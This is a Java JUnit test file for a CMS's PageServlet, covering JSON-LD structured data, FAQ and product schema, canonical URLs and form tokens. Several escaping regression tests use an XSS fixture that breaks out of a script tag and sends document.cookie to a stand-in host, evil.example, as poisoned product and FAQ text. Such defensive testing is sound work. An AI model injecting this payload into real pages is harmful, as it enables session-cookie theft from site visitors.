/*
 * Copyright 2026 SimIS Inc. (https://www.simiscms.com)
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *     http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */

package com.simisinc.platform.presentation.controller;

import static org.junit.jupiter.api.Assertions.assertDoesNotThrow;
import static org.junit.jupiter.api.Assertions.assertEquals;
import static org.junit.jupiter.api.Assertions.assertFalse;
import static org.junit.jupiter.api.Assertions.assertNull;
import static org.junit.jupiter.api.Assertions.assertTrue;
import static org.mockito.Mockito.mockStatic;

import java.math.BigDecimal;
import java.sql.Timestamp;
import java.util.ArrayList;
import java.util.Collections;
import java.util.HashMap;
import java.util.List;
import java.util.Map;

import org.junit.jupiter.api.Test;
import org.mockito.MockedStatic;

import com.fasterxml.jackson.databind.JsonNode;
import com.fasterxml.jackson.databind.ObjectMapper;
import com.simisinc.platform.application.cms.LoadWebPageCommand;
import com.simisinc.platform.domain.model.SocialMediaLink;
import com.simisinc.platform.domain.model.cms.FaqQuestion;
import com.simisinc.platform.domain.model.cms.WebPage;
import com.simisinc.platform.domain.model.items.Collection;
import com.simisinc.platform.domain.model.items.Item;
import com.simisinc.platform.infrastructure.persistence.SocialMediaLinkRepository;

/**
 * The JSON-LD block is rendered into main.jsp with
 * &lt;script type="application/ld+json"&gt;&lt;c:out value="${pageRenderInfo.jsonLdData}" escapeXml="false" /&gt;&lt;/script&gt;
 * -- escapeXml is intentionally false so the JSON syntax isn't HTML-entity-mangled, which means
 * generateJsonLdData is the only thing standing between admin/content-editor-supplied text
 * (item name, page title/description, site name) and a script-context breakout.
 *
 * @author elizabeth houser
 */
class PageServletTest {

  private static final ObjectMapper MAPPER = new ObjectMapper();

  @Test
  void escapeForInlineScriptNeutralizesHtmlBreakoutCharacters() {
    assertEquals("\\u003c/script\\u003e", PageServlet.escapeForInlineScript("</script>"));
    assertEquals("\\u003c!--", PageServlet.escapeForInlineScript("<!--"));
    assertEquals("a \\u0026\\u0026 b", PageServlet.escapeForInlineScript("a && b"));
    assertNull(PageServlet.escapeForInlineScript(null));
  }

  @Test
  void escapeForInlineScriptPreservesJsonMeaning() throws Exception {
    // The escaped form must still be valid JSON and decode back to the original text --
    // \u003c/\u003e/\u0026 are ordinary JSON string escapes, not a different encoding.
    String original = "<script>alert(document.cookie)</script> & \"quoted\"";
    String json = MAPPER.writeValueAsString(original);
    String escaped = PageServlet.escapeForInlineScript(json);
    JsonNode parsed = MAPPER.readTree(escaped);
    assertEquals(original, parsed.asText());
  }

  @Test
  void generateJsonLdDataEscapesAPoisonedProductName() {
    // Regression test for issue #403: this used to poison an Item name to reach the Product
    // block, back when Product was (incorrectly) sourced from the generic Items/Collections
    // system. Product is now sourced from pageRenderInfo's bridged product fields instead (see
    // computeProductSchema), so the poison goes in there -- the security property under test
    // (escapeForInlineScript covers the whole serialized object) is unchanged either way.
    PageRenderInfo pageRenderInfo = new PageRenderInfo();
    pageRenderInfo.setPageUrl("https://example.org/products/widget");
    pageRenderInfo.setTitle("Widget");
    pageRenderInfo.setProductName("</script><script>fetch('https://evil.example/steal?c='+document.cookie)</script>");
    pageRenderInfo.setProductDescription("Also \"quoted\" and <b>bold</b>");

    Map<String, String> sitePropertyMap = new HashMap<>();
    sitePropertyMap.put("site.name", "Example Co");

    Item item = new Item();
    item.setName("</script><script>fetch('https://evil.example/steal?c='+document.cookie)</script>");
    item.setDescription("Also \"quoted\" and <b>bold</b>");

    String jsonLd;
    try (MockedStatic<SocialMediaLinkRepository> socialLinks = mockStatic(SocialMediaLinkRepository.class);
        MockedStatic<LoadWebPageCommand> loadWebPage = mockStatic(LoadWebPageCommand.class)) {
      socialLinks.when(SocialMediaLinkRepository::findAll).thenReturn(Collections.emptyList());
      // "/products" isn't a real WebPage link (it's the collection's own segment, with no
      // Collection given here) -- computeBreadcrumbList falls back to loadByLink for it
      loadWebPage.when(() -> LoadWebPageCommand.loadByLink(org.mockito.ArgumentMatchers.anyString())).thenReturn(null);
      jsonLd = PageServlet.generateJsonLdData(pageRenderInfo, "https://example.org", "/products/widget", sitePropertyMap, item, null, null);
    }

    assertFalse(jsonLd.toLowerCase().contains("</script"),
        "a poisoned product name must not be able to close the surrounding <script> tag: " + jsonLd);
    assertFalse(jsonLd.contains("<script>"), "a poisoned product name must not open a new <script> tag: " + jsonLd);

    // Still valid, semantically unchanged JSON once parsed
    JsonNode parsed = assertDoesNotThrow(() -> MAPPER.readTree(jsonLd));
    // @graph = [Organization, WebPage, BreadcrumbList, Product] -- /products/widget is 2 levels deep
    JsonNode product = parsed.get("@graph").get(3);
    assertEquals("Product", product.get("@type").asText());
    assertTrue(product.get("name").asText().contains("</script><script>"));
  }

  @Test
  void computeFaqSchemaReturnsNullWhenThereAreNoQuestions() {
    assertNull(PageServlet.computeFaqSchema(new PageRenderInfo()));
  }

  @Test
  void computeFaqSchemaBuildsAQuestionEntityForEachFaqQuestion() {
    PageRenderInfo pageRenderInfo = new PageRenderInfo();
    FaqQuestion first = new FaqQuestion();
    first.setQuestion("What is a widget?");
    first.setAnswerHtml("A <strong>widget</strong> is a small thing.");
    first.setAnswerText("A widget is a small thing.");
    FaqQuestion second = new FaqQuestion();
    second.setQuestion("How much do they cost?");
    second.setAnswerHtml("Prices vary.");
    second.setAnswerText("Prices vary.");
    List<FaqQuestion> faqQuestionList = new ArrayList<>();
    faqQuestionList.add(first);
    faqQuestionList.add(second);
    pageRenderInfo.addFaqQuestions(faqQuestionList);

    Map<String, Object> faqPage = PageServlet.computeFaqSchema(pageRenderInfo);

    assertEquals("FAQPage", faqPage.get("@type"));
    @SuppressWarnings("unchecked")
    List<Map<String, Object>> mainEntity = (List<Map<String, Object>>) faqPage.get("mainEntity");
    assertEquals(2, mainEntity.size());
    assertEquals("Question", mainEntity.get(0).get("@type"));
    assertEquals("What is a widget?", mainEntity.get(0).get("name"));
    @SuppressWarnings("unchecked")
    Map<String, Object> acceptedAnswer = (Map<String, Object>) mainEntity.get(0).get("acceptedAnswer");
    assertEquals("Answer", acceptedAnswer.get("@type"));
    assertEquals("A widget is a small thing.", acceptedAnswer.get("text"),
        "the schema must use the HTML-stripped answer, not the widget's rendered HTML");
  }

  @Test
  void generateJsonLdDataEscapesAPoisonedFaqQuestion() {
    PageRenderInfo pageRenderInfo = new PageRenderInfo();
    pageRenderInfo.setPageUrl("https://example.org/faq");
    FaqQuestion poisoned = new FaqQuestion();
    poisoned.setQuestion("</script><script>fetch('https://evil.example/steal?c='+document.cookie)</script>");
    poisoned.setAnswerText("Also \"quoted\" and <b>bold</b>, stripped or not");
    List<FaqQuestion> faqQuestionList = new ArrayList<>();
    faqQuestionList.add(poisoned);
    pageRenderInfo.addFaqQuestions(faqQuestionList);

    Map<String, String> sitePropertyMap = new HashMap<>();
    sitePropertyMap.put("site.name", "Example Co");

    String jsonLd;
    try (MockedStatic<SocialMediaLinkRepository> socialLinks = mockStatic(SocialMediaLinkRepository.class)) {
      socialLinks.when(SocialMediaLinkRepository::findAll).thenReturn(Collections.emptyList());
      // "/faq" is a single segment -- computeBreadcrumbList returns null, so @graph stays
      // [Organization, WebPage, FAQPage]
      jsonLd = PageServlet.generateJsonLdData(pageRenderInfo, "https://example.org", "/faq", sitePropertyMap, null, null, null);
    }

    assertFalse(jsonLd.toLowerCase().contains("</script"),
        "a poisoned question must not be able to close the surrounding <script> tag: " + jsonLd);
    assertFalse(jsonLd.contains("<script>"), "a poisoned question must not open a new <script> tag: " + jsonLd);

    JsonNode parsed = assertDoesNotThrow(() -> MAPPER.readTree(jsonLd));
    JsonNode faqPage = parsed.get("@graph").get(2);
    assertEquals("FAQPage", faqPage.get("@type").asText());
    assertTrue(faqPage.get("mainEntity").get(0).get("name").asText().contains("</script><script>"));
  }

  @Test
  void computeProductSchemaReturnsNullWhenNotAProductPage() {
    // productName is only ever set by an ecommerce widget like ProductNameWidget; a plain page
    // must not get a fabricated Product entry
    assertNull(PageServlet.computeProductSchema(new PageRenderInfo(), "https://example.org"));
  }

  @Test
  void computeProductSchemaIncludesASingleOfferForAOneSkuProduct() {
    PageRenderInfo pageRenderInfo = new PageRenderInfo();
    pageRenderInfo.setProductName("Widget");
    pageRenderInfo.setProductDescription("A fine widget");
    pageRenderInfo.setProductImageUrl("/images/widget.jpg");
    pageRenderInfo.setProductPrice(new BigDecimal("19.99"));
    pageRenderInfo.setProductCurrency("USD");
    pageRenderInfo.setProductAvailability("https://schema.org/InStock");

    Map<String, Object> product = PageServlet.computeProductSchema(pageRenderInfo, "https://example.org");

    assertEquals("Product", product.get("@type"));
    assertEquals("Widget", product.get("name"));
    assertEquals("A fine widget", product.get("description"));
    assertEquals("https://example.org/images/widget.jpg", product.get("image"));

    @SuppressWarnings("unchecked")
    Map<String, Object> offer = (Map<String, Object>) product.get("offers");
    assertEquals("Offer", offer.get("@type"));
    assertEquals("19.99", offer.get("price"));
    assertEquals("USD", offer.get("priceCurrency"));
    assertEquals("https://schema.org/InStock", offer.get("availability"));
  }

  @Test
  void computeProductSchemaIncludesAnAggregateOfferForAMultiSkuProduct() {
    PageRenderInfo pageRenderInfo = new PageRenderInfo();
    pageRenderInfo.setProductName("Widget");
    pageRenderInfo.setProductLowPrice(new BigDecimal("9.99"));
    pageRenderInfo.setProductOfferCount(3);
    pageRenderInfo.setProductCurrency("USD");

    Map<String, Object> product = PageServlet.computeProductSchema(pageRenderInfo, "https://example.org");

    @SuppressWarnings("unchecked")
    Map<String, Object> offer = (Map<String, Object>) product.get("offers");
    assertEquals("AggregateOffer", offer.get("@type"));
    assertEquals("9.99", offer.get("lowPrice"));
    assertEquals(3, offer.get("offerCount"));
    assertEquals("USD", offer.get("priceCurrency"));
  }

  @Test
  void computeProductSchemaOmitsOffersWhenNoPriceIsSet() {
    PageRenderInfo pageRenderInfo = new PageRenderInfo();
    pageRenderInfo.setProductName("Widget");

    Map<String, Object> product = PageServlet.computeProductSchema(pageRenderInfo, "https://example.org");

    assertNull(product.get("offers"));
  }

  @Test
  void generateJsonLdDataIncludesSameAsForEachSocialMediaLink() {
    PageRenderInfo pageRenderInfo = new PageRenderInfo();
    pageRenderInfo.setPageUrl("https://example.org/");

    Map<String, String> sitePropertyMap = new HashMap<>();
    sitePropertyMap.put("site.name", "Example Co");

    SocialMediaLink linkedIn = new SocialMediaLink();
    linkedIn.setPlatformName("LinkedIn");
    linkedIn.setUrl("https://www.linkedin.com/company/example-co");
    SocialMediaLink twitter = new SocialMediaLink();
    twitter.setPlatformName("Twitter");
    twitter.setUrl("https://twitter.com/examplenco");
    List<SocialMediaLink> links = new ArrayList<>();
    links.add(linkedIn);
    links.add(twitter);

    String jsonLd;
    try (MockedStatic<SocialMediaLinkRepository> socialLinks = mockStatic(SocialMediaLinkRepository.class)) {
      socialLinks.when(SocialMediaLinkRepository::findAll).thenReturn(links);
      jsonLd = PageServlet.generateJsonLdData(pageRenderInfo, "https://example.org", "/", sitePropertyMap, null, null, null);
    }

    JsonNode parsed = assertDoesNotThrow(() -> MAPPER.readTree(jsonLd));
    JsonNode organization = parsed.get("@graph").get(0);
    assertEquals("Organization", organization.get("@type").asText());
    JsonNode sameAs = organization.get("sameAs");
    assertEquals(2, sameAs.size());
    assertEquals("https://www.linkedin.com/company/example-co", sameAs.get(0).asText());
    assertEquals("https://twitter.com/examplenco", sameAs.get(1).asText());
  }

  @Test
  void generateJsonLdDataOmitsSameAsWhenThereAreNoSocialMediaLinks() {
    PageRenderInfo pageRenderInfo = new PageRenderInfo();
    pageRenderInfo.setPageUrl("https://example.org/");

    Map<String, String> sitePropertyMap = new HashMap<>();
    sitePropertyMap.put("site.name", "Example Co");

    String jsonLd;
    try (MockedStatic<SocialMediaLinkRepository> socialLinks = mockStatic(SocialMediaLinkRepository.class)) {
      socialLinks.when(SocialMediaLinkRepository::findAll).thenReturn(Collections.emptyList());
      jsonLd = PageServlet.generateJsonLdData(pageRenderInfo, "https://example.org", "/", sitePropertyMap, null, null, null);
    }

    JsonNode parsed = assertDoesNotThrow(() -> MAPPER.readTree(jsonLd));
    JsonNode organization = parsed.get("@graph").get(0);
    assertNull(organization.get("sameAs"));
  }

  @Test
  void generateJsonLdDataIncludesDateModifiedAndDatePublishedFromWebPage() {
    PageRenderInfo pageRenderInfo = new PageRenderInfo();
    pageRenderInfo.setPageUrl("https://example.org/about");

    Map<String, String> sitePropertyMap = new HashMap<>();
    sitePropertyMap.put("site.name", "Example Co");

    WebPage webPage = new WebPage();
    webPage.setCreated(Timestamp.from(java.time.Instant.parse("2026-01-01T00:00:00Z")));
    webPage.setPublishAt(Timestamp.from(java.time.Instant.parse("2026-02-01T00:00:00Z")));
    webPage.setModified(Timestamp.from(java.time.Instant.parse("2026-03-15T12:30:00Z")));

    String jsonLd;
    try (MockedStatic<SocialMediaLinkRepository> socialLinks = mockStatic(SocialMediaLinkRepository.class)) {
      socialLinks.when(SocialMediaLinkRepository::findAll).thenReturn(Collections.emptyList());
      jsonLd = PageServlet.generateJsonLdData(pageRenderInfo, "https://example.org", "/about", sitePropertyMap, null, null, webPage);
    }

    JsonNode parsed = assertDoesNotThrow(() -> MAPPER.readTree(jsonLd));
    JsonNode webPageNode = parsed.get("@graph").get(1);
    assertEquals("WebPage", webPageNode.get("@type").asText());
    assertEquals("2026-03-15T12:30:00Z", webPageNode.get("dateModified").asText());
    // datePublished prefers publishAt over created when both are present
    assertEquals("2026-02-01T00:00:00Z", webPageNode.get("datePublished").asText());
  }

  @Test
  void generateJsonLdDataFallsBackToCreatedForDatePublishedWhenPublishAtIsMissing() {
    PageRenderInfo pageRenderInfo = new PageRenderInfo();
    pageRenderInfo.setPageUrl("https://example.org/about");

    Map<String, String> sitePropertyMap = new HashMap<>();
    sitePropertyMap.put("site.name", "Example Co");

    WebPage webPage = new WebPage();
    webPage.setCreated(Timestamp.from(java.time.Instant.parse("2026-01-01T00:00:00Z")));

    String jsonLd;
    try (MockedStatic<SocialMediaLinkRepository> socialLinks = mockStatic(SocialMediaLinkRepository.class)) {
      socialLinks.when(SocialMediaLinkRepository::findAll).thenReturn(Collections.emptyList());
      jsonLd = PageServlet.generateJsonLdData(pageRenderInfo, "https://example.org", "/about", sitePropertyMap, null, null, webPage);
    }

    JsonNode parsed = assertDoesNotThrow(() -> MAPPER.readTree(jsonLd));
    JsonNode webPageNode = parsed.get("@graph").get(1);
    assertEquals("2026-01-01T00:00:00Z", webPageNode.get("datePublished").asText());
    assertNull(webPageNode.get("dateModified"));
  }

  @Test
  void generateJsonLdDataOmitsDatesWhenWebPageIsNull() {
    PageRenderInfo pageRenderInfo = new PageRenderInfo();
    pageRenderInfo.setPageUrl("https://example.org/items/staff/jane-doe");

    Map<String, String> sitePropertyMap = new HashMap<>();
    sitePropertyMap.put("site.name", "Example Co");

    // Item detail pages have no WebPage at all -- this must not throw or fabricate dates
    String jsonLd;
    try (MockedStatic<SocialMediaLinkRepository> socialLinks = mockStatic(SocialMediaLinkRepository.class);
        MockedStatic<LoadWebPageCommand> loadWebPage = mockStatic(LoadWebPageCommand.class)) {
      socialLinks.when(SocialMediaLinkRepository::findAll).thenReturn(Collections.emptyList());
      loadWebPage.when(() -> LoadWebPageCommand.loadByLink(org.mockito.ArgumentMatchers.anyString())).thenReturn(null);
      jsonLd = PageServlet.generateJsonLdData(pageRenderInfo, "https://example.org", "/items/staff/jane-doe", sitePropertyMap, null, null, null);
    }

    JsonNode parsed = assertDoesNotThrow(() -> MAPPER.readTree(jsonLd));
    JsonNode webPageNode = parsed.get("@graph").get(1);
    assertEquals("WebPage", webPageNode.get("@type").asText());
    assertNull(webPageNode.get("dateModified"));
    assertNull(webPageNode.get("datePublished"));
  }

  @Test
  void isFormTokenValidAcceptsAMatchingToken() {
    assertTrue(PageServlet.isFormTokenValid("abc-123", "abc-123"));
  }

  @Test
  void isFormTokenValidRejectsAMismatchedToken() {
    assertFalse(PageServlet.isFormTokenValid("wrong-token", "abc-123"));
  }

  @Test
  void isFormTokenValidRejectsABlankOrMissingRequestToken() {
    assertFalse(PageServlet.isFormTokenValid("", "abc-123"));
    assertFalse(PageServlet.isFormTokenValid(null, "abc-123"));
  }

  @Test
  void isFormTokenValidRejectsANullSessionToken() {
    assertFalse(PageServlet.isFormTokenValid("abc-123", null));
  }

  @Test
  void computeCanonicalUrlReturnsNullWhenSiteUrlIsBlank() {
    assertNull(PageServlet.computeCanonicalUrl("", "/legal/privacy", null, null, null));
    assertNull(PageServlet.computeCanonicalUrl(null, "/legal/privacy", null, null, null));
  }

  @Test
  void computeCanonicalUrlCoversTheHomepage() {
    // Regression test for issue #401: the homepage previously fell through every branch (an
    // explicit !pagePath.equals("/") check excluded it, and there's no WebPage/Item/Collection
    // for a plain root request), so it was the one page that never got a canonical tag at all.
    assertEquals("https://example.org/", PageServlet.computeCanonicalUrl("https://example.org", "/", null, null, null));
  }

  @Test
  void computeCanonicalUrlUsesThePagePathWhenNothingElseIdentifiesThePage() {
    assertEquals("https://example.org/legal/privacy",
        PageServlet.computeCanonicalUrl("https://example.org", "/legal/privacy", null, null, null));
  }

  @Test
  void computeCanonicalUrlPrefersTheWebPageLinkOverTheRequestPath() {
    // A page can be reached by more than one path (aliases, trailing-slash variants); the
    // canonical URL should point at the page's own configured link, not whichever path this
    // particular request happened to use.
    WebPage webPage = new WebPage();
    webPage.setLink("/about-us");

    assertEquals("https://example.org/about-us",
        PageServlet.computeCanonicalUrl("https://example.org", "/about", webPage, null, null));
  }

  @Test
  void computeCanonicalUrlUsesTheRequestPathForAWildcardTemplatePage() {
    // A wildcard/template WebPage (LoadWebPageCommand#loadByLink's dynamic-page fallback, e.g. a
    // "/news/*" blog listing page) resolves to a WebPage whose own link is the literal template
    // pattern, not the requested post's URL. Unlike the alias case above, that template link must
    // NOT be used as the canonical URL -- it would leak the "*" character into the tag.
    WebPage webPage = new WebPage();
    webPage.setLink("/news/*");

    assertEquals("https://example.org/news/some-post-slug",
        PageServlet.computeCanonicalUrl("https://example.org", "/news/some-post-slug", webPage, null, null));
  }

  @Test
  void computeCanonicalUrlUsesTheCollectionPathForACollectionPage() {
    Collection collection = new Collection();
    collection.setUniqueId("staff");

    assertEquals("https://example.org/items/staff",
        PageServlet.computeCanonicalUrl("https://example.org", "/items/staff", null, null, collection));
  }

  @Test
  void computeCanonicalUrlUsesTheItemAndCollectionPathForAnItemDetailPage() {
    Collection collection = new Collection();
    collection.setUniqueId("staff");
    Item item = new Item();
    item.setUniqueId("jane-doe");

    assertEquals("https://example.org/items/staff/jane-doe",
        PageServlet.computeCanonicalUrl("https://example.org", "/items/staff/jane-doe", null, item, collection));
  }
}
